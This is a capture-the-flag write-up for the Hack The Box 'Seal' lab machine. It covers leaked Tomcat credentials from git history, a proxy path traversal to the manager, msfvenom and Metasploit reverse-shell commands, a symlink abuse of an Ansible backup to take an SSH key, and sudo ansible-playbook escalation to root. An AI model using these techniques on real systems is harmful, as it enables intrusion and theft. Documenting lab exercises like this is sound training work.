# Seal machine
## nmap scan
```log
Nmap scan report for 10.129.180.180
Host is up (0.48s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Mon, 12 Jul 2021 13:59:50 GMT
|     Set-Cookie: JSESSIONID=node06kmxbvt64ql61qfcldliv5v722.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Mon, 12 Jul 2021 13:59:50 GMT
|     Set-Cookie: JSESSIONID=node0198yno9a3b5gd1aqh59y5ohkkw0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 12 Jul 2021 13:59:50 GMT
|     Set-Cookie: JSESSIONID=node0qg96zc5gh3sn3z6gombasswe1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/html;charset=utf-8).

```

## seal.htb website
<p align="center">
  <img  src="Pasted image 20210712162952.png">
</p>

### wappalyzer
<p align="center">
  <img  src="Pasted image 20210712163048.png">
</p>
Found nothing to do

I went to check the `8080` http port

<p align="center">
  <img  src="Pasted image 20210712163218.png">
</p>
Gitbucket : looks like a modified version of github
I created an account and logged in.

Found a user named `root` with 2 repos

<p align="center">
  <img  src="Pasted image 20210712163404.png">
</p>

the `seal_market` repo looks like the source code for the **seal.htb** web app

<p align="center">
  <img  src="Pasted image 20210712163537.png">
</p>

I found a `tomcat-user.xml` file in the tomcat folder that kinda has credentials but no passwords 

<p align="center">
  <img  src="Pasted image 20210712163734.png">
</p>

I checked the previous commits and found the password : 

<p align="center">
  <img  src="Pasted image 20210712164003.png">
</p>

```
username : tomcat
password : 42MrHBf*z8{Z%
```

Can't get to `manager/html`, the nginx proxy is misconfigured so I can do a tomcat path traversal :
<p align="center">
  <img  src="Pasted image 20210713092704.png">
</p>

Gives me this :

<p align="center">
  <img  src="Pasted image 20210713092726.png">
</p>

I enter the credentials : 

<p align="center">
  <img  src="Pasted image 20210713092833.png">
</p>

Here we can possibly upload a war reverse shell, let's try it :

<p align="center">
  <img  src="Pasted image 20210713093303.png">
</p>

I used this command to generate the shell :

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[YOUR_IP] LPORT=[YOUR_PORT] -f war > reverse.war
```

I deployed a netcat listener :

<p align="center">
  <img  src="Pasted image 20210713093603.png">
</p>

But everytime I try to upload and deploy the shell it gives me 403 access denied :

<p align="center">
  <img  src="Pasted image 20210713102040.png">
</p>

So I went to use msf :

```bash
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.129.182.186
msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 443
msf6 exploit(multi/http/tomcat_mgr_upload) > set ssl true
msf6 exploit(multi/http/tomcat_mgr_upload) > set targeturi /images/..;/manager
msf6 exploit(multi/http/tomcat_mgr_upload) > set httppassword 42MrHBf*z8{Z%
msf6 exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set lhost 10.10.14.119
```

And got the shell :

<p align="center">
  <img  src="Pasted image 20210713105507.png">
</p>

I found a YAML file in `/opt/backups/playbook` that probably gets executed as a task :

```yaml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/

```

We can see that it backs-up the `admin/dashboard` folder, and it has the parameter `copy_links` set to `yes`

When I searched about it in the documentation, I found out that it copies the linked folders and files too 

<p align="center">
  <img  src="Pasted image 20210713133119.png">
</p>

So I went and created a link to the `home` folder in the `uploads` folder which was the one accessible to everyone :

```bash
ln -s /home/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/
```

I transferred it to my machine and ssh-ed in using the SSH key in id_rsa and got the user flag : 

<p align="center">
  <img  src="Pasted image 20210713133428.png">
</p>

## Root Flag
Running `sudo -l` :

<p align="center">
  <img  src="Pasted image 20210713144021.png">
</p>

We can run `ansible-playbook` as sudo
So let's write a YAML file to cat the `root.txt` file and execute it as root
```yaml
---
- name: Root flag
  hosts: localhost

  tasks:
  - name: Show the root flag
    command: "cat /root/root.txt"
    register: result
  - debug: var=result

```
The `register` flag stores the output in the `result` variable and `debug` show it in the terminal

```bash
sudo ansible-playbook root_flag.yml
```

We execute the command :

<p align="center">
  <img  src="Pasted image 20210713144957.png">
</p>

We got the root flag !